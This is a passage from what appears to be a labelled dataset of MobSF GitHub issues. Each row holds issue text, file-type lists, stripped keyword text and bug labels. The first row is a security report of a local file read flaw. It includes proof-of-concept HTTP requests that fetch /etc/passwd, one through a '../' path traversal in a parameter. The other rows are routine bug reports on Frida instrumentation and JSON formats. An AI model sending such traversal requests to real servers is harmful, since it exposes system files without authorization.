0.0.0.0:8000 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3971.0 Safari/537.36 autochrome/blue Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close ",source-file | source-file | source-file | source-file | source-file,security local reading regression important see errors running setup scripts mostly installed required dependencies correctly look errors figure causing solve accordingly make sure installed required dependencies correct versions per latest documentation still find dead end join mobsf slack channel http tiny mobsf please post help github issues definitely waste time get closed without response environment docker latest explanation possible read system steps reproduce poc specify absolute path get viewfile etc passwd type ios http host upgrade insecure requests user agent mozilla linux applewebkit khtml like gecko chrome safari autochrome blue accept text html application xhtml xml application xml image webp image apng application signed exchange accept encoding gzip deflate accept language connection close poc specify path instead real get viewfile etc passwd type ios http host upgrade insecure requests user agent mozilla linux applewebkit khtml like gecko chrome safari autochrome blue accept text html application xhtml xml application xml image webp image apng application signed exchange accept encoding gzip deflate accept language connection close,bug,0.9,"[Security] Local file reading regression < 3.0.0 <!-- ## IMPORTANT --> <!-- If you see errors while running setup/run scripts, it is mostly because you haven't installed the required dependencies correctly. You will have to look into the errors and figure out what is causing them and solve them accordingly. Make sure you have installed all the required dependencies and their correct versions as per the latest documentation. If you still find yourself at a dead end, join MobSF Slack channel: http://tiny.cc/mobsf Please do not post support/help request in GitHub issues, doing so will definitely waste our time get them closed without further response. --> ## ENVIRONMENT  Docker latest version  ## EXPLANATION OF THE ISSUE It is possible to read any file on the system. ## STEPS TO REPRODUCE THE ISSUE 1st poc (specify absolute path):  GET /ViewFile/?file=/etc/passwd&md5=376a1470cd79dc44a96615337c5b51c2&type=ios HTTP/1.1 Host: 0.0.0.0:8000 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3971.0 Safari/537.36 autochrome/blue Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close  2nd poc (specify path instead of real md5):  GET /ViewFile/?file=etc/passwd&md5=../../../../../../../../../..&type=ios HTTP/1.1 Host: 0.0.0.0:8000 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3971.0 Safari/537.36 autochrome/blue Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close "
2432,Mobile-Security-Framework-MobSF,https://github.com/MobSF/Mobile-Security-Framework-MobSF/issues/2432,Frida API Monitor API is responding ERROR message for OK response,"<!-- ## IMPORTANT --> <!-- Issues are ONLY for reporting BUGS. For support, feature requests, questions, queries, and discussions use our slack channel for limited support. Join MobSF Slack channel: https://join.slack.com/t/mobsf/shared_invite/zt-2huaz2nj9-ifViLV7g7w1xthx5D6rGhw --> <!-- If you see errors while running setup/run scripts, it is mostly because you haven't installed the required dependencies correctly. You will have to look into the errors and figure out what is causing them and solve them accordingly. Make sure you have installed all the required dependencies and their correct versions as per the latest documentation. If you still find yourself at a dead end, join MobSF Slack channel:https://join.slack.com/t/mobsf/shared_invite/zt-2huaz2nj9-ifViLV7g7w1xthx5D6rGhw Please do not post support/help request in GitHub issues, doing so will definitely waste our time get them closed without further response. --> ## ENVIRONMENT  OS and Version: Ubuntu 20.04 Python Version: 3.11.9 MobSF Version: v4.0.7  ## EXPLANATION OF THE ISSUE I write a method to start Frida Instrumentation  def start_Frida_instrument(host_url, api_key, file_hash, default_hooks='api_monitor,ssl_pinning_bypass,root_bypass,debugger_check_bypass', auxiliary_hooks='', frida_code=''):  Start Frida to monitor API at runtime. @param host_url: @param api_key: @param file_hash: @return:  print(""Starting Frida API instrument"") api_url = host_url + ""/api/v1/frida/instrument"" headers = { ""Authorization"": api_key } data = { ""hash"": file_hash, ""default_hooks"": default_hooks, ""auxiliary_hooks"": auxiliary_hooks, ""frida_code"": frida_code } try: response = requests.post(api_url, headers=headers, data=data) if response.status_code == 200: return response.json() else: return {""error"": response.json(), ""status_code"": response.status_code} except Exception as e: return {""error"": str(e)}  However, when I execute this method, the response is **{'message': 'Failed to instrument app', 'status': 'ok'}**. Other methods I use are as follows:  def upload_file(host_url, api_key, file_path):  Upload apk file to the server @param host_url: ip:port of the server @param api_key: API key of MobSF @param file_path: file path of the apk @return:  print(""Uploading file"") multipart_data = MultipartEncoder(fields={'file': (file_path, open(file_path, 'rb'), 'application/octet-stream')}) headers = {'Content-Type': multipart_data.content_type, 'Authorization': api_key} response = requests.post(host_url + '/api/v1/upload', data=multipart_data, headers=headers) return response.text def scan_file(host_url, api_key, file_hash): print(""Starting static scan"") api_url = f""{host_url}/api/v1/scan"" headers = { ""Authorization"": api_key, } data = { ""hash"": file_hash, } try: response = requests.post(api_url, headers=headers, data=data) if response.status_code == 200: return response.json() else: return {""error"": response.text, ""status_code"": response.status_code} except Exception as e: return {""error"": str(e)} def start_dynamic_analysis(host_url, api_key, file_hash, re_install=1, install=1):  Start dynamic analysis. @param host_url: @param api_key: @param file_hash: @param re_install: @param install: @return:  print(""Starting dynamic analysis. Probably several minutes"") api_url = host_url + ""/api/v1/dynamic/start_analysis"" headers = { ""Authorization"": api_key } data = { ""hash"": file_hash, ""re_install"": re_install, ""install"": install } try: response = requests.post(api_url, headers=headers, data=data) if response.status_code == 200: return response.json() else: print({""error"": response.json(), ""status_code"": response.status_code}) return None except Exception as e: return None  <!-- If you see errors while running setup/run scripts, join MobSF Slack channel: https://join.slack.com/t/mobsf/shared_invite/zt-2huaz2nj9-ifViLV7g7w1xthx5D6rGhw to get limited support. --> ## STEPS TO REPRODUCE THE ISSUE  1. Upload an APK file via api. 2. Scan the APK and get the hash. 3. Start dynamic analysis via api. 4. Run the start_Frida_instrument method.  ## LOG FILE The info log is as follows:  [INFO] 10/Oct/2024 00:38:07 - Test Completed. Resuming HTTPS Proxy [INFO] 10/Oct/2024 00:38:07 - Installing MobSF RootCA [INFO] 10/Oct/2024 00:38:07 - Starting HTTPS Proxy on 1337 [INFO] 10/Oct/2024 00:38:07 - Starting Instrumentation [INFO] 10/Oct/2024 00:38:07 - Frida Server is already running [INFO] 10/Oct/2024 00:38:07 - Spawning com.FootballStadiumDesign.lukoni [ERROR] 10/Oct/2024 00:38:08 - Internal Server Error: /api/v1/frida/api_monitor [DEBUG] 10/Oct/2024 00:38:11 - [Frida] Loaded Frida Script - debugger_check_bypass [DEBUG] 10/Oct/2024 00:38:11 - [Frida] Loaded Frida Script - root_bypass [DEBUG] 10/Oct/2024 00:38:11 - [Frida] Loaded Frida Script - ssl_pinning_bypass [DEBUG] 10/Oct/2024 00:38:11 - [Frida] Loaded Frida Script - api_monitor [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [SSL Pinning Bypass] okhttp CertificatePinner not found [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [SSL Pinning Bypass] okhttp3 CertificatePinner not found [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [SSL Pinning Bypass] DataTheorem trustkit not found [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [SSL Pinning Bypass] Appcelerator PinningTrustManager not found [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [SSL Pinning Bypass] Apache Cordova SSLCertificateChecker not found [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [SSL Pinning Bypass] Wultra CertStore.validateFingerprint not found [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [SSL Pinning Bypass] Xutils not found [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [SSL Pinning Bypass] httpclientandroidlib not found [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [SSL Pinning Bypass] Cronet not found [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [SSL Pinning Bypass] certificatetransparency.CTInterceptorBuilder not found [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [API Monitor] Cannot find org.apache.http.impl.client.AbstractHttpClient.execute [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [API Monitor] Cannot find com.android.okhttp.internal.http.HttpURLConnectionImpl.getInputStream  <!-- BEFORE POSTING YOUR ISSUE/BUG - These comments won't show up when you submit the issue. - GitHub issues ARE NOT FOR FEATURE REQUESTS, SUPPORT, DISCUSSIONS AND QUESTIONS! - If you have questions, use our slack channel. Join MobSF Slack channel: https://bit.ly/3mCMNOx - Reproduce issue in the latest master and try to add as much detail as possible. - Search this repository (top of the page) for the issue and it has not been fixed or reported already. - Once you open a bug, you should also provide additional information if requested. - Failure to do so in 25 days will result in closure of the bug without further communication. -->",test-file | config-file | container-file | documentation-file | config-file | source-file | source-file | test-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | other-file | other-file | other-file | other-file | documentation-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | other-file | other-file | other-file | other-file | other-file | config-file | config-file | other-file | config-file,frida api monitor api responding message response important issues reporting bugs feature requests questions queries discussions use slack channel limited join mobsf slack channel https join slack mobsf shared invite huaz ifvilv xthx rghw see errors running setup scripts mostly installed required dependencies correctly look errors figure causing solve accordingly make sure installed required dependencies correct versions per latest documentation still find dead end join mobsf slack channel https join slack mobsf shared invite huaz ifvilv xthx rghw please post help github issues definitely waste time get closed without response environment ubuntu python mobsf explanation write method start frida instrumentation def start frida instrument host url api key hash default hooks api monitor ssl pinning bypass root bypass debugger check bypass auxiliary hooks frida start frida monitor api runtime param host url param api key param hash return print starting frida api instrument api url host url api frida instrument headers authorization api key data hash hash default hooks default hooks auxiliary hooks auxiliary hooks frida frida response requests post api url headers headers data data response status return response json else return response json status response status except exception return str however execute method response message failed instrument app status methods use follows def upload host url api key path upload apk server param host url port server param api key api key mobsf param path path apk return print uploading multipart data multipartencoder fields path open path application octet stream headers content type multipart data content type authorization api key response requests post host url api upload data multipart data headers headers return response text def scan host url api key hash print starting static scan api url host url api scan headers authorization api key data hash hash response requests post api url headers headers data data response status return response json else return response text status response status except exception return str def start dynamic analysis host url api key hash install install start dynamic analysis param host url param api key param hash param install param install return print starting dynamic analysis probably several minutes api url host url api dynamic start analysis headers authorization api key data hash hash install install install install response requests post api url headers headers data data response status return response json else print response json status response status return none except exception return none see errors running setup scripts join mobsf slack channel https join slack mobsf shared invite huaz ifvilv xthx rghw get limited steps reproduce upload apk via api scan apk get hash start dynamic analysis via api start frida instrument method log log follows oct completed resuming https proxy oct installing mobsf rootca oct starting https proxy oct starting instrumentation oct frida server already running oct spawning footballstadiumdesign lukoni oct internal server api frida api monitor oct frida loaded frida script debugger check bypass oct frida loaded frida script root bypass oct frida loaded frida script ssl pinning bypass oct frida loaded frida script api monitor oct frida ssl pinning bypass okhttp certificatepinner found oct frida ssl pinning bypass okhttp certificatepinner found oct frida ssl pinning bypass datatheorem trustkit found oct frida ssl pinning bypass appcelerator pinningtrustmanager found oct frida ssl pinning bypass apache cordova sslcertificatechecker found oct frida ssl pinning bypass wultra certstore validatefingerprint found oct frida ssl pinning bypass xutils found oct frida ssl pinning bypass httpclientandroidlib found oct frida ssl pinning bypass cronet found oct frida ssl pinning bypass certificatetransparency ctinterceptorbuilder found oct frida api monitor cannot find apache http impl client abstracthttpclient execute oct frida api monitor cannot find android okhttp internal http httpurlconnectionimpl getinputstream posting bug comments show submit github issues feature requests discussions questions questions use slack channel join mobsf slack channel https bit mcmnox reproduce latest much detail possible search repository top page fixed reported already open bug also provide additional information requested failure days result closure bug without communication,bug,0.9,"Frida API Monitor API is responding ERROR message for OK response <!-- ## IMPORTANT --> <!-- Issues are ONLY for reporting BUGS. For support, feature requests, questions, queries, and discussions use our slack channel for limited support. Join MobSF Slack channel: https://join.slack.com/t/mobsf/shared_invite/zt-2huaz2nj9-ifViLV7g7w1xthx5D6rGhw --> <!-- If you see errors while running setup/run scripts, it is mostly because you haven't installed the required dependencies correctly. You will have to look into the errors and figure out what is causing them and solve them accordingly. Make sure you have installed all the required dependencies and their correct versions as per the latest documentation. If you still find yourself at a dead end, join MobSF Slack channel:https://join.slack.com/t/mobsf/shared_invite/zt-2huaz2nj9-ifViLV7g7w1xthx5D6rGhw Please do not post support/help request in GitHub issues, doing so will definitely waste our time get them closed without further response. --> ## ENVIRONMENT  OS and Version: Ubuntu 20.04 Python Version: 3.11.9 MobSF Version: v4.0.7  ## EXPLANATION OF THE ISSUE I write a method to start Frida Instrumentation  def start_Frida_instrument(host_url, api_key, file_hash, default_hooks='api_monitor,ssl_pinning_bypass,root_bypass,debugger_check_bypass', auxiliary_hooks='', frida_code=''):  Start Frida to monitor API at runtime. @param host_url: @param api_key: @param file_hash: @return:  print(""Starting Frida API instrument"") api_url = host_url + ""/api/v1/frida/instrument"" headers = { ""Authorization"": api_key } data = { ""hash"": file_hash, ""default_hooks"": default_hooks, ""auxiliary_hooks"": auxiliary_hooks, ""frida_code"": frida_code } try: response = requests.post(api_url, headers=headers, data=data) if response.status_code == 200: return response.json() else: return {""error"": response.json(), ""status_code"": response.status_code} except Exception as e: return {""error"": str(e)}  However, when I execute this method, the response is **{'message': 'Failed to instrument app', 'status': 'ok'}**. Other methods I use are as follows:  def upload_file(host_url, api_key, file_path):  Upload apk file to the server @param host_url: ip:port of the server @param api_key: API key of MobSF @param file_path: file path of the apk @return:  print(""Uploading file"") multipart_data = MultipartEncoder(fields={'file': (file_path, open(file_path, 'rb'), 'application/octet-stream')}) headers = {'Content-Type': multipart_data.content_type, 'Authorization': api_key} response = requests.post(host_url + '/api/v1/upload', data=multipart_data, headers=headers) return response.text def scan_file(host_url, api_key, file_hash): print(""Starting static scan"") api_url = f""{host_url}/api/v1/scan"" headers = { ""Authorization"": api_key, } data = { ""hash"": file_hash, } try: response = requests.post(api_url, headers=headers, data=data) if response.status_code == 200: return response.json() else: return {""error"": response.text, ""status_code"": response.status_code} except Exception as e: return {""error"": str(e)} def start_dynamic_analysis(host_url, api_key, file_hash, re_install=1, install=1):  Start dynamic analysis. @param host_url: @param api_key: @param file_hash: @param re_install: @param install: @return:  print(""Starting dynamic analysis. Probably several minutes"") api_url = host_url + ""/api/v1/dynamic/start_analysis"" headers = { ""Authorization"": api_key } data = { ""hash"": file_hash, ""re_install"": re_install, ""install"": install } try: response = requests.post(api_url, headers=headers, data=data) if response.status_code == 200: return response.json() else: print({""error"": response.json(), ""status_code"": response.status_code}) return None except Exception as e: return None  <!-- If you see errors while running setup/run scripts, join MobSF Slack channel: https://join.slack.com/t/mobsf/shared_invite/zt-2huaz2nj9-ifViLV7g7w1xthx5D6rGhw to get limited support. --> ## STEPS TO REPRODUCE THE ISSUE  1. Upload an APK file via api. 2. Scan the APK and get the hash. 3. Start dynamic analysis via api. 4. Run the start_Frida_instrument method.  ## LOG FILE The info log is as follows:  [INFO] 10/Oct/2024 00:38:07 - Test Completed. Resuming HTTPS Proxy [INFO] 10/Oct/2024 00:38:07 - Installing MobSF RootCA [INFO] 10/Oct/2024 00:38:07 - Starting HTTPS Proxy on 1337 [INFO] 10/Oct/2024 00:38:07 - Starting Instrumentation [INFO] 10/Oct/2024 00:38:07 - Frida Server is already running [INFO] 10/Oct/2024 00:38:07 - Spawning com.FootballStadiumDesign.lukoni [ERROR] 10/Oct/2024 00:38:08 - Internal Server Error: /api/v1/frida/api_monitor [DEBUG] 10/Oct/2024 00:38:11 - [Frida] Loaded Frida Script - debugger_check_bypass [DEBUG] 10/Oct/2024 00:38:11 - [Frida] Loaded Frida Script - root_bypass [DEBUG] 10/Oct/2024 00:38:11 - [Frida] Loaded Frida Script - ssl_pinning_bypass [DEBUG] 10/Oct/2024 00:38:11 - [Frida] Loaded Frida Script - api_monitor [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [SSL Pinning Bypass] okhttp CertificatePinner not found [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [SSL Pinning Bypass] okhttp3 CertificatePinner not found [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [SSL Pinning Bypass] DataTheorem trustkit not found [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [SSL Pinning Bypass] Appcelerator PinningTrustManager not found [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [SSL Pinning Bypass] Apache Cordova SSLCertificateChecker not found [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [SSL Pinning Bypass] Wultra CertStore.validateFingerprint not found [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [SSL Pinning Bypass] Xutils not found [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [SSL Pinning Bypass] httpclientandroidlib not found [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [SSL Pinning Bypass] Cronet not found [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [SSL Pinning Bypass] certificatetransparency.CTInterceptorBuilder not found [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [API Monitor] Cannot find org.apache.http.impl.client.AbstractHttpClient.execute [DEBUG] 10/Oct/2024 00:38:11 - [Frida] [API Monitor] Cannot find com.android.okhttp.internal.http.HttpURLConnectionImpl.getInputStream  <!-- BEFORE POSTING YOUR ISSUE/BUG - These comments won't show up when you submit the issue. - GitHub issues ARE NOT FOR FEATURE REQUESTS, SUPPORT, DISCUSSIONS AND QUESTIONS! - If you have questions, use our slack channel. Join MobSF Slack channel: https://bit.ly/3mCMNOx - Reproduce issue in the latest master and try to add as much detail as possible. - Search this repository (top of the page) for the issue and it has not been fixed or reported already. - Once you open a bug, you should also provide additional information if requested. - Failure to do so in 25 days will result in closure of the bug without further communication. -->"
2464,Mobile-Security-Framework-MobSF,https://github.com/MobSF/Mobile-Security-Framework-MobSF/issues/2464,In the tasks list json the status field has different formats,"## ENVIRONMENT  MobSF Version: 4.2.4  ## EXPLANATION OF THE ISSUE when calling the api/v1/tasks endpoint, in the tasks lists the ""status"" field is either a string or an object depending on the status itself. This is a problem because the json format is coherent and it makes impossible to create a proper mapper for the object;",container-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | config-file,tasks list json status field different formats environment mobsf explanation calling api tasks endpoint tasks lists status field either string object depending status json format coherent makes impossible create proper mapper object,bug,0.95,"In the tasks list json the status field has different formats ## ENVIRONMENT  MobSF Version: 4.2.4  ## EXPLANATION OF THE ISSUE when calling the api/v1/tasks endpoint, in the tasks lists the ""status"" field is either a string or an object depending on the status itself. This is a problem because the json format is coherent and it makes impossible to create a proper mapper for the object;"
